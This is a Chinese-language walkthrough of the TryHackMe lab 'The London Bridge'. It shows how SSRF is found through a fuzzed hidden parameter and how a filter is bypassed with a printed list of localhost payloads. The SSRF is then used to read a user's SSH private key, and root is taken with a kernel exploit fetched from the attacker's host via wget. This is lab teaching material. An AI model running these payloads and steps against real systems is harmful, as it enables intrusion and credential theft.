# The London Bridge

> 🚩 **The London Bridge** — TryHackMe
>
> [👉 点击进入靶场房间](https://tryhackme.com/room/thelondonbridge)
>
---

### 1. 信息收集 (Recon)
执行端口扫描：
```bash
nmap -p- 10.10.x.x
```
使用 Nmap 扫描目标时，我们可以发现有两个开放端口，每个端口运行不同的服务。端口 `22` 为 SSH，端口 `8080` 为 HTTP。
![截图](./The%20London%20Bridge/01.png)

下一步进行根目录扫描，在从初步扫描中，我们发现除了`/dejaview`和`/upload`，没有其他异常，可进行页面访问。
```bash
gobuster dir -u ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
![截图](./The%20London%20Bridge/02.png)

我们在首页看到一个欢迎页面。除此之外，源代码中我们没有发现任何异常。
![截图](./The%20London%20Bridge/03.png)

在/gallery里我们看到了`upload`，可以进行简单的测试，但是并无什么结果。
![截图](./The%20London%20Bridge/04.png)

### 2.初次尝试
在URL尾部添加`/dejaview`进行访问，发现是一个查询图片的搜索框，可以输入URL
![截图](./The%20London%20Bridge/05.png)

尝试访问`/galler`的图片文件路径，无疑是可行的
![截图](./The%20London%20Bridge/06.png)
![截图](./The%20London%20Bridge/07.png)

我们使用 Burp Suite 拦截了画廊中现有图像的一个样本查询
![截图](./The%20London%20Bridge/08.png)

我们现在尝试使用我们知道的服务器的本地地址和端口，但没有获取到任何内容
![截图](./The%20London%20Bridge/09.png)

检查开发阶段可能会遗留其他参数，或许我们可以模糊测试其他参数。

### 3.探索隐藏参数

我们使用 FuFF 来寻找参数
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X POST -u 'http://ip:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fs 823 -s -mc all
```
![截图](./The%20London%20Bridge/10.png)

我们得到了`www`参数

### 4.发现 SSRF
我们立即检查 SSRF，用Python设置了一个 Web 服务器，并测试是否可以建立连接
![截图](./The%20London%20Bridge/11.png)
无疑是成功的
![截图](./The%20London%20Bridge/12.png)

### 5.枚举内部服务
我们现在来看看可以通过这个参数做什么。首先，我们要识别不同输入触发的不同响应。这样就能看看我们是否走在了正确的道路上。

尝试输入`a`不是`URL`，我们会得到一个内部服务器错误。
![截图](./The%20London%20Bridge/13.png)

如果输入本地地址 `127.0.0.1` ，我们会收到一条消息，表示我们没有访问权限。
![截图](./The%20London%20Bridge/14.png)

同样适用于我们已知的服务 `8080`也不行
![截图](./The%20London%20Bridge/15.png)

似乎存在一个过滤器，用于过滤对 `127.0.0.1` 的请求，而我们有不同表示形式的 `localhost` 来绕过这种过滤器。

用以下来源来寻找绕过过滤器的办法
> [👉 绕过技巧指南](https://highon.coffee/blog/ssrf-cheat-sheet/)

由于这些有效载荷是为端口 `80` 提供的，但我们只知道 `8080` 实际上是一个运行中的服务，因此我们修改了列表并提供在这里
```bash
127.0.0.1:8080
127.0.0.1:443
127.0.0.1:22
127.1:8080
0
0.0.0.0:8080
localhost:8080
[::]:8080/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:8080/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:8080\@127.2.2.2:8080/
127.1.1.1:8080\@@127.2.2.2:8080/
127.1.1.1:8080:\@@127.2.2.2:8080/
127.1.1.1:8080#\@127.2.2.2:8080/
```

将其保存到文档 `localhost.txt`，接下来，我们对可能的表示进行模糊测试，并找到一个有效的表示
```bash
ffuf -w localhost.txt -X POST -u 'http://ip:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://FUZZ' -fw 27
```
为了方便我选择用`127.1`
![截图](./The%20London%20Bridge/16.png)

现在我们尝试枚举所有内部开放端口，使用 `localhost` 表示 127.1 。另一个服务则运行在端口 `80` 上。
```bash
seq 65365 > ports.txt
```
```bash
ffuf -w ports.txt -X POST -u 'http://ip:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:FUZZ' -fw 37
```
![截图](./The%20London%20Bridge/17.png)

当我们使用 SSRF 访问`80`端口页面时，我们会得到一个不同的索引页面
![截图](./The%20London%20Bridge/18.png)
![截图](./The%20London%20Bridge/19.png)

### 6.揭开帷幕，查看源码
接下来，我们要枚举了端口 `80` 上所有可能的目录。用`ffuf`，只发现了`templates` `uploads` `static`
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://ip:8080/view_image' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/FUZZ' -fw 96
```
![截图](./The%20London%20Bridge/20.png)

三个文件里明显没有什么可用信息，我们参数在FUZZ前添加`.`来扩大搜索范围，在`ssh`里会有重大发现 
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://ip:8080/view_image' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/.FUZZ' -fw 96
```
![截图](./The%20London%20Bridge/21.png)

我们查看`.ssh`里的文件内容发现了`authorized_keys`文件和`id_rsa`私钥
![截图](./The%20London%20Bridge/22.png)

请求`authorized_keys`文件，看到并确定了用户`beth`
![截图](./The%20London%20Bridge/23.png)

查看`id_rsa`私钥，把内容复制下来并保存到终端
![截图](./The%20London%20Bridge/24.png)

### 7.以 Beth 的身份使用 Shell
先调整我们的 `id_rsa` 文件的权限，然后我们使用该密钥通过 `SSH` 以 `beth` 身份访问机器

我们搜索 `user.txt` ，并能够在 `/home/beth/__pycache__/user.txt` 找到它。
```bash
find / -type f -name 'user.txt' 2>/dev/null
```
![截图](./The%20London%20Bridge/25.png)

### 8.以 Root 的身份使用 Shell
先查看内核版本
```bash
uname -a
```
![截图](./The%20London%20Bridge/26.png)
接下来我们通过谷歌浏览搜索有没有特定的漏洞，结果还真有
```bash
google kernel exploit 4.15.0-112
```
![截图](./The%20London%20Bridge/27.png)
> [👉 GitHub](https://github.com/zerozenxlabs/ZDI-24-020/blob/main/exploit.c)
检查搜索结果，版本是符合我们的目标。
![截图](./The%20London%20Bridge/28.png)

我们克隆了仓库，并使用 Python Web 服务器提供内容
![截图](./The%20London%20Bridge/29.png)

接下来，我们将克隆的文件在目标机器上用递归获取所有内容，以便在那里进行编译
```bash
wget -r http://10.8.211.1/ZDI-24-020
```

现在我们只需要调用 make 来正确编译它
![截图](./The%20London%20Bridge/30.png)

运行漏洞利用后，我们处于 `root` 状态，可以访问 `/root/.root.txt`里的root flag
![截图](./The%20London%20Bridge/31.png)